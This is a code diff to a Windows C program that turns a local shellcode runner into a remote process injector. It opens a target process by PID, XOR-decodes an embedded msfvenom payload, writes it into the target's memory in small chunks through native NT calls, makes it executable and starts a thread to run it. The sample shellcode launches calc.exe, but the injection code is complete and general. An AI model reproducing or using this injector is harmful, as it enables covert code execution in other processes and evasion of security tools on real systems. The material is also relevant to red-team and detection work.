@@ -6,9 +6,12 @@
 #include <stdio.h>
 #include <Windows.h>
 
+#include <tlhelp32.h>
+#pragma comment (lib, "crypt32.lib")
+
+#define NT_SUCCESS(x) ((x) >= 0)
 
 #define DEBUG
-
 
 // msfvenom -p windows/x64/exec CMD=calc.exe -f raw
 static unsigned char payload[] = {
@@ -44,60 +47,204 @@ static unsigned char key[] = {
 };
 
 
-INT wmain()
+DWORD ConvertNtStatusToWin32Error(LONG ntstatus)
+{
+	DWORD oldError;
+	DWORD result;
+	DWORD br;
+	OVERLAPPED o;
+
+	o.Internal = ntstatus;
+	o.InternalHigh = 0;
+	o.Offset = 0;
+	o.OffsetHigh = 0;
+	o.hEvent = 0;
+	oldError = GetLastError();
+	GetOverlappedResult(NULL, &o, &br, FALSE);
+	result = GetLastError();
+	SetLastError(oldError);
+	return result;
+}
+
+void PrintStatus(NTSTATUS status) {
+#ifdef DEBUG
+	LPCTSTR strErrorMessage = NULL;
+	FormatMessage(
+		FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS | FORMAT_MESSAGE_ARGUMENT_ARRAY | FORMAT_MESSAGE_ALLOCATE_BUFFER,
+		NULL,
+		ConvertNtStatusToWin32Error(status),
+		0,
+		(LPWSTR)&strErrorMessage,
+		0,
+		NULL);
+
+	wprintf(L"[!] Error: %s\n", (LPCWSTR)strErrorMessage);
+#endif
+}
+
+ULONG InjectMemory(HANDLE ProcessHandle, PVOID DestinationAddress, ULONG NumberOfBytesToWrite) {
+
+	ULONG bytesWritten = 0;
+	ULONG numberOfBytesToWrite = NumberOfBytesToWrite;
+	SIZE_T chunkSize = sizeof(payload);
+	PVOID ulWritten = NULL;
+	PVOID lpAddress = NULL;
+	SIZE_T sDataSize = sizeof(payload);
+
+	if (NtAllocateVirtualMemory((HANDLE)-1, &lpAddress, 0, &chunkSize, MEM_COMMIT, PAGE_READWRITE) != 0x00) {
+
+#ifdef DEBUG
+		printf("[!] Failed to call NtAllocateVirtualMemory\n");
+#endif
+
+		return 8;
+	}
+
+	chunkSize = 4;
+
+	while (numberOfBytesToWrite > 0) {
+		ulWritten = NULL;
+
+		long long int dst = ((long long int)(VOID *)DestinationAddress) + bytesWritten;
+
+		if ((SIZE_T)numberOfBytesToWrite < chunkSize) {
+			chunkSize = numberOfBytesToWrite;
+		}
+
+		for (SIZE_T i = 0; i < chunkSize; ++i)
+			((PUINT8)lpAddress)[i] = payload[bytesWritten + i] ^ key[(bytesWritten + i) % sizeof(key)];
+
+		NTSTATUS status;
+		
+		if (!NT_SUCCESS(status = NtWriteVirtualMemory(ProcessHandle, dst, lpAddress, (ULONG)chunkSize, &ulWritten)))
+		{
+			PrintStatus(status);
+
+			return 9;
+		}
+
+		bytesWritten += (ULONG)ulWritten;
+		numberOfBytesToWrite -= (ULONG)ulWritten;
+	}
+
+	return bytesWritten;
+}
+
+INT wmain(int argc, char* argv[])
 {
 	HANDLE hThread;
 	HANDLE hUser32;
 
 	NTSTATUS status;
 	ULONG ulOldProtect;
+	PVOID ulWritten = NULL;
 
 	PVOID lpAddress = NULL;
+	PVOID rpAddress = NULL;
 	SIZE_T sDataSize = sizeof(payload);
+	int pid = 0;
+	HANDLE hProc = NULL;
+
+	if (argc <= 1)
+	{
+		return 1;
+	}
+
+	pid = _wtoi(argv[1]);
+
 
 	if (!InitApi()) {
 #ifdef DEBUG
 		printf("[!] Failed to initialize API");
 #endif
-		return 1;
+		return 2;
+	}
+
+
+#ifdef DEBUG
+	printf("Target PID = %d\n\n", pid);
+
+	printf(
+		"0x%p = encoded payload\n",
+		payload
+	);
+
+#endif
+
+	// try to open target process
+	hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
+		PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
+		FALSE, (DWORD)pid);
+
+	if (hProc == NULL)
+	{
+#ifdef DEBUG
+		printf("[!] Failed to get process handle");
+#endif
+		return 3;
 	}
 
 #ifdef DEBUG
-	printf("\n[*] Press enter to call NtAllocateVirtualMemory "); getchar();
+	printf("\n[*] Press enter to call NtAllocateVirtualMemory ");  getchar();
 #endif
 
-	status = NtAllocateVirtualMemory((HANDLE)-1, &lpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);
-
-	// Write decoded payload into the allocated region
-	for (SIZE_T i = 0; i < sizeof(payload); ++i)
-		((PUINT8)lpAddress)[i] = payload[i] ^ key[i % sizeof(key)];
+	if (!NT_SUCCESS(status = NtAllocateVirtualMemory(hProc, &rpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE)))
+	{
+#ifdef DEBUG
+		printf("[!] Failed to allocate memory");
+#endif
+		PrintStatus(status);
+		return 4;
+	}
 
 #ifdef DEBUG
 	printf(
 		"\n"
-		"0x%p = payload\n"
-		"0x%p = lpAddress\n",
-		payload, lpAddress
+		"0x%p = remote shellcode addr\n",
+		rpAddress
 	);
 
+#endif
+
+#ifdef DEBUG
+	printf("\n[*] Press enter to Inject memory ");  getchar();
+	printf("[*] Injecting payload\n");
+#endif
+
+	if (InjectMemory(hProc, rpAddress, sizeof(payload)) != sizeof(payload))
+	{
+#ifdef DEBUG
+		printf("[!] Failed to inject memory");
+#endif
+		PrintStatus(status);
+		return 5;
+	}
+
+#ifdef DEBUG
 	printf("\n[*] Press enter to call NtProtectVirtualMemory ");  getchar();
 #endif
 
 	ulOldProtect = 0;
-	status = NtProtectVirtualMemory((HANDLE)-1, &lpAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);
-
+	if (!NT_SUCCESS(status = NtProtectVirtualMemory(hProc, &rpAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect)))
+	{
 #ifdef DEBUG
-	printf("[*] Press enter to call NtCreateThreadEx ");  getchar();
+		printf("\n[*] Press enter to call NtCreateThreadEx ");  getchar();
 #endif
+		PrintStatus(status);
+		return 6;
+	}
 
 	hThread = INVALID_HANDLE_VALUE;
-	status = NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
-
+	if (!NT_SUCCESS(status = NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProc, (LPTHREAD_START_ROUTINE)rpAddress, NULL, FALSE, NULL, NULL, NULL, NULL)))
+	{
 #ifdef DEBUG
-	printf("[*] Press enter to call NtWaitForSingleObject ");  getchar();
+		printf("[*] Calling NtWaitForSingleObject\n");
 #endif
+		PrintStatus(status);
+		return 7;
+	}
 
-	status = NtWaitForSingleObject(hThread, FALSE, NULL);
+	NtWaitForSingleObject(hThread, FALSE, (PLARGE_INTEGER)-1);
 
 	return 0x00;
 }
